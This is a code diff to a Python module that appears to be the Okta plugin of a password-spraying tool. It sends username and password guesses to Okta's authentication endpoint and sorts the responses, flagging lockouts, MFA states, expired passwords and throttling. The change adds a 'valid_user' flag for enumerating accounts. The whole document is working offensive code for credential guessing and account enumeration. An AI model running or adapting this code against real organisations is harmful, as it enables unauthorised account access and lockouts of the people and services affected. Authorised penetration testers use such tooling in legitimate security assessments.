@@ -5,8 +5,9 @@ def okta_authenticate(url, username, password, useragent, pluginargs):
 
     data_response = {
         'result': None,    # Can be "success", "failure" or "potential"
-		'error' : False,
-        'output' : ""
+        'error': False,
+        'output' : "",
+        'valid_user' : False
     }
 
     raw_body = "{\"username\":\"%s\",\"password\":\"%s\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true}}" % (username, password)
@@ -33,48 +34,40 @@ def okta_authenticate(url, username, password, useragent, pluginargs):
             resp_json = json.loads(resp.text)
 
             if resp_json.get("status") == "LOCKED_OUT": #Warning: administrators can configure Okta to not indicate that an account is locked out. Fair warning ;)
-                data_response['success'] = "failure"
+                data_response['result'] = "failure"
                 data_response['output'] ='[-] FAILURE: Locked out {}:{}'.format(username, password)
-                # data_response['action'] = 'redirect'
-                # utils.slacklog("Alert: Accounts are being locked out. Consider stopping spray")
+                data_response['valid_user'] = True
 
             elif resp_json.get("status") == "SUCCESS":
-                data_response['success'] = "success"
+                data_response['result'] = "success"
                 data_response['output'] = '[+] SUCCESS: => {}:{}'.format(username, password)
-                # utils.slacknotify(username, password + "\nInfo: NO MFA Required!")
+                data_response['valid_user'] = True
 
             elif resp_json.get("status") == "MFA_REQUIRED":
-                # data_response['2fa_enabled'] = True
-                data_response['success'] = "success"
+                data_response['result'] = "success"
                 data_response['output'] = "[+] SUCCESS: 2FA => {}:{}".format(username,password)
-                # utils.slacknotify(username, password + "\nInfo: MFA Configured.")
+                data_response['valid_user'] = True
 
             elif resp_json.get("status") == "PASSWORD_EXPIRED":
-                # data_response['change'] = True
-                data_response['success'] = "success"
+                data_response['result'] = "success"
                 data_response['output'] = "[+] SUCCESS: password expired {}:{}".format(username,password)
-                # utils.slacknotify(username, password + "\nInfo: Password Expired.")
+                data_response['valid_user'] = True
 
             elif resp_json.get("status") == "MFA_ENROLL":
-                data_response['success'] = "success"
+                data_response['result'] = "success"
                 data_response['output'] = "[+] SUCCESS: MFA enrollment required {}:{}".format(username,password)
-                # utils.slacknotify(username, password + "\nInfo: MFA is not configured!")
+                data_response['valid_user'] = True
 
             else:
-                data_response['success'] = "failure"
+                data_response['result'] = "failure"
                 data_response['output'] = "[?] ALERT: 200 but doesn't indicate success {}:{}".format(username,password)
-                # utils.slacklog("Alert: We got a 200 but it is not clear if creds are valid")
-                # utils.slacknotify(username, password + "\nInfo: May be valid, proceed with caution!")
 
         elif resp.status_code == 403:
-                data_response['success'] = "failure"
-                # data_response['code'] = resp.status_code
+                data_response['result'] = "failure"
                 data_response['output'] = "[-] FAILURE THROTTLE INDICATED: {} => {}:{}".format(resp.status_code, username, password)
-                # utils.slacklog("Alert: Throttle Detected, proceed with caution")
 
         else:
-            data_response['success'] = "failure"
-            # data_response['code'] = resp.status_code
+            data_response['result'] = "failure"
             data_response['output'] = "[-] FAILURE: {} => {}:{}".format(resp.status_code, username, password)
 
 
